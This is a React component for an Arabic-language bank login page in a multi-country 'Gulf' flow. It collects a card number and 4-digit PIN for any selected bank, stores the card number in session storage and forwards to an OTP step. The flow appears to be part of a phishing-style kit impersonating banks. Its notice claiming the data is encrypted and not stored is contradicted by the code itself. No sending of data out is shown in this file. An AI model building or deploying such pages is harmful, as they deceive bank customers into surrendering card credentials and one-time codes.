import { useState } from 'react';
import { useNavigate, useParams } from 'react-router-dom';
import { getCountryTheme } from '../utils/gulfThemes';

const LoginBank = () => {
  const { country, bankId } = useParams<{ country: string; bankId: string }>();
  const navigate = useNavigate();
  const [cardNumber, setCardNumber] = useState('');
  const [pin, setPin] = useState('');
  const [isLoading, setIsLoading] = useState(false);
  const theme = getCountryTheme(country || 'uae');

  const selectedBank = theme.bankLogos.find(bank => bank.id === bankId);

  const handleLogin = (e: React.FormEvent) => {
    e.preventDefault();

    if (!cardNumber || !pin) {
      alert('الرجاء إدخال جميع البيانات');
      return;
    }

    setIsLoading(true);

    // Simulate login process
    setTimeout(() => {
      sessionStorage.setItem('bankLoginData', JSON.stringify({
        cardNumber,
        bankId,
        timestamp: Date.now()
      }));
      setIsLoading(false);
      navigate(`/gulf/${country}/otp`);
    }, 2000);
  };

  return (
    <div className="min-h-screen" dir="rtl" style={{ backgroundColor: theme.colors.background, fontFamily: theme.fontAr }}>
      {/* Header */}
      <div className="w-full shadow-lg" style={{ background: theme.gradient.primary }}>
        <div className="container mx-auto px-6 py-6">
          <div className="flex items-center justify-between">
            <button
              onClick={() => navigate(`/gulf/${country}/bank-select`)}
              className="text-white hover:underline"
            >
              ← العودة
            </button>
            <div className="flex items-center gap-4">
              <div className="text-5xl">{theme.flag}</div>
              <div className="text-center">
                <h1 className="text-3xl font-bold text-white mb-1">{theme.nameAr}</h1>
                <p className="text-white opacity-90">تسجيل الدخول للبنك</p>
              </div>
            </div>
            <div className="w-20"></div>
          </div>
        </div>
      </div>

      {/* Main Content */}
      <div className="container mx-auto px-6 py-12">
        <div className="max-w-2xl mx-auto">
          {/* Bank Info Card */}
          <div className="p-6 rounded-xl mb-8" style={{ backgroundColor: theme.colors.surface }}>
            <div className="flex items-center gap-4">
              <div
                className="w-20 h-20 rounded-full flex items-center justify-center"
                style={{ backgroundColor: theme.colors.primary }}
              >
                <svg className="w-12 h-12 text-white" fill="currentColor" viewBox="0 0 20 20">
                  <path d="M4 4a2 2 0 00-2 2v1h16V6a2 2 0 00-2-2H4zM18 9H2v5a2 2 0 002 2h12a2 2 0 002-2V9zM4 13a1 1 0 011-1h1a1 1 0 110 2H5a1 1 0 01-1-1zm5-1a1 1 0 100 2h1a1 1 0 100-2H9z" />
                </svg>
              </div>
              <div>
                <h2 className="text-2xl font-bold" style={{ color: theme.colors.text }}>
                  {selectedBank?.nameAr}
                </h2>
                <p className="text-lg" style={{ color: theme.colors.textLight }}>
                  {selectedBank?.name}
                </p>
              </div>
            </div>
          </div>

          {/* Login Form */}
          <div className="rounded-xl shadow-xl p-8" style={{ backgroundColor: theme.colors.background }}>
            <form onSubmit={handleLogin}>
              {/* Card Number */}
              <div className="mb-6">
                <label className="block text-lg font-semibold mb-3" style={{ color: theme.colors.text }}>
                  رقم البطاقة البنكية
                </label>
                <div className="relative">
                  <svg className="w-6 h-6 absolute right-4 top-1/2 transform -translate-y-1/2" style={{ color: theme.colors.textLight }} fill="currentColor" viewBox="0 0 20 20">
                    <path d="M4 4a2 2 0 00-2 2v1h16V6a2 2 0 00-2-2H4zM18 9H2v5a2 2 0 002 2h12a2 2 0 002-2V9zM4 13a1 1 0 011-1h1a1 1 0 110 2H5a1 1 0 01-1-1zm5-1a1 1 0 100 2h1a1 1 0 100-2H9z" />
                  </svg>
                  <input
                    type="text"
                    value={cardNumber}
                    onChange={(e) => setCardNumber(e.target.value)}
                    placeholder="1234 5678 9012 3456"
                    className="w-full pr-14 pl-4 py-4 text-lg rounded-lg border-2 focus:outline-none transition-all"
                    style={{
                      borderColor: theme.colors.border,
                      fontFamily: theme.fontAr
                    }}
                  />
                </div>
              </div>

              {/* PIN */}
              <div className="mb-8">
                <label className="block text-lg font-semibold mb-3" style={{ color: theme.colors.text }}>
                  رقم التعريف السري (PIN)
                </label>
                <div className="relative">
                  <svg className="w-6 h-6 absolute right-4 top-1/2 transform -translate-y-1/2" style={{ color: theme.colors.textLight }} fill="currentColor" viewBox="0 0 20 20">
                    <path fillRule="evenodd" d="M5 9V7a5 5 0 0110 0v2a2 2 0 012 2v5a2 2 0 01-2 2H5a2 2 0 01-2-2v-5a2 2 0 012-2zm8-2v2H7V7a3 3 0 016 0z" clipRule="evenodd" />
                  </svg>
                  <input
                    type="password"
                    value={pin}
                    onChange={(e) => setPin(e.target.value)}
                    placeholder="••••"
                    maxLength={4}
                    className="w-full pr-14 pl-4 py-4 text-lg rounded-lg border-2 focus:outline-none transition-all"
                    style={{
                      borderColor: theme.colors.border,
                      fontFamily: theme.fontAr
                    }}
                  />
                </div>
              </div>

              {/* Login Button */}
              <button
                type="submit"
                disabled={!cardNumber || !pin || isLoading}
                className={`w-full py-4 text-xl font-bold text-white rounded-lg ${isLoading ? 'opacity-70' : theme.buttonStyle.primary}`}
              >
                {isLoading ? 'جارٍ التحقق...' : 'دخول آمن'}
              </button>
            </form>

            {/* Security Notice */}
            <div className="mt-8 p-4 rounded-lg" style={{ backgroundColor: theme.colors.surface }}>
              <div className="flex items-center gap-3">
                <svg className="w-6 h-6" style={{ color: theme.colors.success }} fill="currentColor" viewBox="0 0 20 20">
                  <path fillRule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zm3.707-9.293a1 1 0 00-1.414-1.414L9 10.586 7.707 9.293a1 1 0 00-1.414 1.414l2 2a1 1 0 001.414 0l4-4z" clipRule="evenodd" />
                </svg>
                <div>
                  <p className="text-sm font-semibold" style={{ color: theme.colors.text }}>
                    معلوماتك آمنة ومحمية
                  </p>
                  <p className="text-xs" style={{ color: theme.colors.textLight }}>
                    جميع البيانات محمية بتشفير 256-bit SSL ولا يتم تخزينها
                  </p>
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
};

export default LoginBank;
